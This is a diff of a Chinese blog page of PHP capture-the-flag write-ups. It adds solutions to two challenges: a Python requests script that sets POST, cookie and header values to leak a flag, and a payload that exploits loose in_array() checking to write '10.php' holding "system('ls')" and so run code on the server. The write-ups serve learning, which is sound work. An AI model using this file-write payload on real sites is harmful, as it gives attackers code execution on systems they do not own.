@@ -14,7 +14,7 @@
 <meta property="og:description" content="题目一12345678910111213&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123;    $num &#x3D; $_GET[&#x27;num&#x27;];    if(preg_match(&quot;&#x2F;[0-9]&#x2F;&quot;, $num)">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-04-27T07:47:49.000Z">
-<meta property="article:modified_time" content="2025-04-29T05:22:11.367Z">
+<meta property="article:modified_time" content="2025-04-29T08:15:52.746Z">
 <meta property="article:author" content="Traveler2000">
 <meta property="article:tag" content="PHP">
 <meta name="twitter:card" content="summary">
@@ -194,14 +194,29 @@
 <h2 id="题目六"><a href="#题目六" class="headerlink" title="题目六"></a>题目六</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p><strong>解题思路</strong></p>
-<p>Python 脚本解法：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+<p>本题有四个三元运算符：</p>
+<p>第一个判断是否定义了 <code>$_GET</code> 数组，若定义了，用 <code>$_POST</code> 数组给 <code>$_GET</code> 数组<strong>引用赋值</strong>（ <code>=&amp;</code> ）；若未定义，返回字符串 <code>flag</code> （不会返回到哪里去，后面也是）。</p>
+<p>引用赋值 <code>=&amp;</code> ，类似指针，让 <code>$_GET</code> 和 <code>$_POST</code> 指向同一个数据，之后对 <code>$_GET</code> 的操作会直接影响 <code>$_POST</code>，反之亦然。</p>
+<p>第二个判断 <code>$_GET</code> 数组里的 <code>$_GET[&#39;flag&#39;]</code> 元素的值是否等于 <code>flag</code> ，结合前面的引用赋值，就是判断 <code>$_POST[flag]</code> 元素的值是否等于 <code>flag</code> 。如果等于，则用 <code>$_COOKIE</code> 数组给 <code>$_GET</code> 数组引用赋值。</p>
+<p>第三个与第二个同理，不过最后会用 <code>$_SERVER</code> 数组给 <code>$_GET</code> 数组引用赋值。</p>
+<p>第四个判断 <code>$_SERVER</code> 数组中的 <code>$_SERVER[&#39;HTTP_FLAG&#39;]</code> 元素的值是否等于 <code>flag</code> 。如果等于则会将 <code>$flag</code> 变量作为文件名语法高亮（其实就是找不到该文件时会报错，把 <code>$flag</code> 变量的值回显在前端）。</p>
+<p>所以构造 URL 、请求体、 Cookie 与请求头字段即可得到 flag 。</p>
+<p><strong>Python 脚本解法</strong>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;目标URL&quot;</span></span><br><span class="line">params = &#123; <span class="string">&quot;a&quot;</span>: <span class="string">&quot;1&quot;</span> &#125;  <span class="comment"># URL 传参</span></span><br><span class="line">data = &#123; <span class="string">&quot;flag&quot;</span>: <span class="string">&quot;flag&quot;</span> &#125;  <span class="comment"># POST 数据</span></span><br><span class="line">cookies = &#123; <span class="string">&quot;flag&quot;</span>: <span class="string">&quot;flag&quot;</span> &#125;  <span class="comment"># Cookie</span></span><br><span class="line">headers = &#123; <span class="string">&quot;FLAG&quot;</span>: <span class="string">&quot;flag&quot;</span> &#125;  <span class="comment"># 设置 HTTP 头</span></span><br><span class="line"></span><br><span class="line">response = requests.post( url, params=params, headers=headers, cookies=cookies, data=data )</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>
 
+<p><strong><code>headers = &#123; &quot;FLAG&quot;: &quot;flag&quot; &#125;</code> 的键名为什么不是 <code>HTTP_FLAG</code> 而是 <code>FLAG</code></strong> ：PHP 会把请求头的所有字段转化为大写并加上前缀 <code>HTTP_</code> 再写入 <code>$_SERVER</code> 数组，每个字段都对应一个元素。<code>$_SERVER</code> 数组的详细介绍可查看我写的关于 <code>$_SERVER</code> 数组的介绍。</p>
+<h2 id="题目七"><a href="#题目七" class="headerlink" title="题目七"></a>题目七</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$allow</span>, <span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="variable">$i</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>随机生成 1 到 0x36d 也就是 877 的数字，并添加到 <code>$allow[]</code> 数组中。随后比对数组元素 <code>$_GET[&#39;n&#39;]</code> 的值是否在数组 <code>$allow[]</code> 中，并以 <code>$_GET[&#39;n&#39;]</code> 的值为文件名，将 <code>$_POST[&#39;content&#39;]</code> 写入文件。</p>
+<p>此处的 <code>in_array()</code> 不是严格模式，会转换，根据 PHP 特性，开头为数字的字符串被转化为数字时，后面的字符串会被去掉，所以可以构造 Payload ：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">params = &#123;&quot;n&quot;:&quot;10.php&quot;&#125;  # 那么多次随机数总该生成 10 吧</span><br><span class="line">data = &#123;&quot;content&quot;:&quot;&lt;?php system(&#x27;ls&#x27;);&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过文件名 <code>10.php</code> 来使该文件被访问时会被当成 PHP 文件处理，从而执行恶意代码。</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/27/PHP%E7%89%B9%E6%80%A7%E9%A2%98%E7%9B%AE/" data-id="cma228zym0006xguheb4f8m11" data-title="PHP 特性题目" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://traveler2000.github.io/2025/04/27/PHP%E7%89%B9%E6%80%A7%E9%A2%98%E7%9B%AE/" data-id="cma2cz9xa0006icuhhtl8a9el" data-title="PHP 特性题目" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -217,7 +232,7 @@
       <strong class="article-nav-caption">前一篇</strong>
       <div class="article-nav-title">
         
-          SERVER数组
+          $_SERVER 数组
         
       </div>
     </a>
@@ -284,7 +299,7 @@
       <ul>
         
           <li>
-            <a href="/2025/04/29/SERVER%E6%95%B0%E7%BB%84/">SERVER数组</a>
+            <a href="/2025/04/29/SERVER%E6%95%B0%E7%BB%84/">$_SERVER 数组</a>
           </li>
         
           <li>
